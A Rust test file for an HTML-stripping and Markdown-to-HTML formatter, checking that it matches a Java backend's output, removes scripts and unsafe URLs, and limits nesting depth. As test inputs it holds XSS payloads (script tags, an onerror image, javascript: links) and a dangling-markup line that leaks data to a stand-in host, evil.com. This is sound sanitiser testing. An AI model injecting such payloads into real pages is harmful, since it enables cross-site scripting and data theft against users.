//! BE `TextFormatsTest`의 HTML 포맷터 2개 케이스. 기대값 중 BE 테스트에 없는 것은
//! jsoup 1.23.2·commonmark 0.30.0으로 BE 코드를 그대로 돌려 얻은 값이다.

use chrono::{DateTime, Utc};
use ieum_engine::formatter::apply;
use serde_json::{Map, Value, json};

fn now() -> DateTime<Utc> {
    "2026-11-07T04:30:00Z".parse().unwrap()
}

fn run(event: &str, input: &str) -> String {
    let cfg: Map<String, Value> = Map::from_iter([("input".to_string(), json!(input))]);
    let got = apply(event, &cfg, now()).unwrap_or_else(|e| panic!("{input}: {}", e.message));
    got["output"].as_str().unwrap().to_string()
}

fn strip(input: &str) -> String {
    run("formatter.text_strip_html", input)
}

fn md(input: &str) -> String {
    run("formatter.text_markdown_to_html", input)
}

/// 태그 사이 공백·줄바꿈만 무시하고 비교.
fn same_html(got: &str, want: &str) {
    let gap = regex::Regex::new(r">\s+|\s+<").unwrap();
    let norm = |s: &str| {
        gap.replace_all(s, |c: &regex::Captures| c[0].trim().to_string())
            .into_owned()
    };
    assert_eq!(norm(got), norm(want), "\ngot:  {got}\nwant: {want}");
}

#[test]
fn strip_html_be_cases() {
    assert_eq!(
        strip("<p>안녕 &amp; <b>반가워</b></p><script>alert(1)</script><p>둘째</p>"),
        "안녕 & 반가워\n둘째"
    );
    assert_eq!(strip("a<br>b"), "a\nb");
    assert_eq!(strip("<style>p{color:red}</style><p>본문</p>"), "본문");
    assert_eq!(strip(""), "");
}

#[test]
fn strip_html_matches_jsoup() {
    assert_eq!(strip("a  &nbsp; b\nc\td"), "a b c d");
    assert_eq!(strip("x&#8203;y&shy;z"), "xyz");
    assert_eq!(strip("<pre>  a\n  b</pre>"), "a b");
    assert_eq!(
        strip("<title>T</title><ul><li>1<li>2</ul><table><tr><td>a<td>b</table>"),
        "1\n2\na\nb"
    );
    assert_eq!(
        strip("a<span>b</span><foo>c</foo><custom-el>d</custom-el>"),
        "abcd"
    );
    assert_eq!(
        strip(
            "<div>a<svg><script>x</script><text>s</text></svg></div><textarea>t</textarea><noscript>n</noscript>"
        ),
        "a\ns\nt\nn"
    );
    assert_eq!(strip("plain < text & more"), "plain < text & more");
    assert_eq!(strip("<p>one</p>  <p>two</p><hr>three"), "one\ntwo\nthree");
    assert_eq!(strip("x&#x3000;y z"), "x\u{3000}y z");
    // jsoup은 이 요소들의 내용을 DataNode로 두어 글에서 뺀다(BE 실측).
    assert_eq!(strip("<iframe>if</iframe>z"), "z");
    assert_eq!(strip("<xmp><b>x</b></xmp>"), "");
    assert_eq!(strip("<noembed>ne</noembed>z"), "z");
    // svg·math 안의 같은 이름 요소와 select 안 iframe은 보통 요소라 글이 남는다(jsoup 1.23.2).
    assert_eq!(strip("<svg><iframe>x</iframe></svg>y"), "x\ny");
    assert_eq!(strip("<math><xmp>x</xmp></math>y"), "x\ny");
    assert_eq!(strip("<select><option>a<iframe>x</iframe></select>"), "ax");
}

#[test]
fn strip_html_deep_nesting_does_not_overflow() {
    // 재귀로 걸으면 넘칠 깊이(파서가 깊이에 제곱으로 느려져 디버그 빌드 시간에 맞춰 5천).
    let deep = format!("{}x{}", "<div>".repeat(5_000), "</div>".repeat(5_000));
    assert_eq!(strip(&deep), "x");
}

/// BE `assertNoExecutableHtml` — 글자가 아니라 파싱한 DOM으로 본다.
fn no_executable_html(h: &str) {
    let doc = scraper::Html::parse_fragment(h);
    for sel in [
        "script",
        "[onerror], [onload]",
        "img",
        "[href^='javascript:']",
    ] {
        let s = scraper::Selector::parse(sel).unwrap();
        assert!(doc.select(&s).next().is_none(), "{sel}: {h}");
    }
}

#[test]
fn markdown_be_cases() {
    let h = md(
        "**굵게** <script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))",
    );
    assert!(h.contains("<strong>굵게</strong>"), "{h}");
    no_executable_html(&h);
    same_html(
        &h,
        "<p><strong>굵게</strong> &lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1)&gt; <a>x</a></p>",
    );

    let dangling = md("<div><img src='https://evil.com/leak?x=\n비밀\n'></div>");
    no_executable_html(&dangling);
    same_html(
        &dangling,
        "<p>&lt;div&gt;&lt;img src='https://evil.com/leak?x=\n비밀\n'&gt;&lt;/div&gt;</p>",
    );

    let doc = md("# 제목\n- a");
    assert!(
        doc.contains("<h1>제목</h1>") && doc.contains("<li>a</li>"),
        "{doc}"
    );
    same_html(&doc, "<h1>제목</h1>\n<ul>\n<li>a</li>\n</ul>");

    assert_eq!(md(""), "");
}

#[test]
fn markdown_blocks_script_and_bad_urls() {
    let h = md(
        "<script>alert(1)</script>\n\n[a](javascript:alert(1)) [b](/rel) [c](https://ok.example) ![i](data:x) [t](tel:1)",
    );
    assert!(!h.contains("<script"));
    assert!(!h.contains("javascript:"));
    assert!(!h.contains("href=\"/rel\""));
    assert!(h.contains("href=\"https://ok.example\""));
    assert!(!h.contains("data:x") && !h.contains("tel:1"));
    // BE도 상대 주소·tel·data는 속성째 지우고 태그는 남긴다.
    same_html(
        &h,
        "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>\n<p><a>a</a> <a>b</a> <a href=\"https://ok.example\">c</a> <img alt=\"i\"> <a>t</a></p>",
    );
}

#[test]
fn markdown_urls_match_be() {
    same_html(
        &md(
            "[m](mailto:a@b.c) [f](ftp://x.y/z) ![ok](https://i.example/a.png \"제목\") [q](https://a.b?x=1&y=2 \"t\")",
        ),
        "<p><a href=\"mailto:a@b.c\">m</a> <a>f</a> <img src=\"https://i.example/a.png\" alt=\"ok\" title=\"제목\"> <a href=\"https://a.b?x=1&amp;y=2\" title=\"t\">q</a></p>",
    );
    same_html(
        &md("[rel](rel/x) [frag](#top) [proto](//x.y/z) [up](HTTPS://X.Y) ![rel](a.png)"),
        "<p><a>rel</a> <a>frag</a> <a>proto</a> <a href=\"https://X.Y\">up</a> <img alt=\"rel\"></p>",
    );
    same_html(
        &md("<https://auto.link> <a@b.co>"),
        "<p><a href=\"https://auto.link\">https://auto.link</a> <a href=\"mailto:a@b.co\">a@b.co</a></p>",
    );
}

/// 주소의 공백·비 ASCII 글자: BE는 원문 그대로(`http://x/a b`·`€`) — 러스트는 퍼센트 인코딩(같은 주소, GAPS).
#[test]
fn gap_markdown_url_percent_encoded() {
    same_html(
        &md("[a](<http://x/a b>) https://x.com/€ [e](https://x.com/€)"),
        "<p><a href=\"http://x/a%20b\">a</a> https://x.com/€ <a href=\"https://x.com/%E2%82%AC\">e</a></p>",
    );
}

#[test]
fn markdown_blocks_match_be() {
    same_html(
        &md(
            "> 인용 `코드` *기울임* ~~취소~~\n\n```js\nlet x = 1 < 2;\n```\n\n1. 하나\n2. 둘\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n---\n줄1  \n줄2 <br> &amp; &copy; &#x41;",
        ),
        "<blockquote>\n<p>인용 <code>코드</code> <em>기울임</em> ~~취소~~</p>\n</blockquote>\n<pre><code>let x = 1 &lt; 2;\n</code></pre>\n<ol>\n<li>하나</li>\n<li>둘</li>\n</ol>\n<p>| a | b |\n|---|---|\n| 1 | 2 |</p>\n\n<p>줄1<br>\n줄2 &lt;br&gt; &amp; © A</p>",
    );
}

#[test]
fn markdown_depth_limit() {
    // BE와 같은 결과가 나오는 가장 깊은 곳: 인용 100단계 + 문단, 목록 50단계(ul·li 100).
    let h = md(&format!("{}x", "> ".repeat(100)));
    assert_eq!(h.matches("<blockquote>").count(), 100);
    assert!(h.contains("<p>x</p>"), "{h}");
    assert_eq!(
        md(&format!("{}x", "* ".repeat(50))).matches("<li>").count(),
        50
    );
    // 그보다 깊으면 jsoup이 잘라 내 결과가 달라지므로 실패시킨다(빨리).
    let t = std::time::Instant::now();
    for deep in [
        format!("{}x", "> ".repeat(101)),
        format!("{}x", "* ".repeat(51)),
        format!("{}x", "> ".repeat(49_000)),
    ] {
        let cfg = Map::from_iter([("input".to_string(), json!(deep))]);
        let e = apply("formatter.text_markdown_to_html", &cfg, now()).unwrap_err();
        assert!(
            e.message.contains("Markdown 중첩이 너무 깊어요"),
            "{}",
            e.message
        );
        assert_eq!(e.code.as_deref(), Some("TOO_LARGE"));
    }
    assert!(t.elapsed() < std::time::Duration::from_secs(1));
}
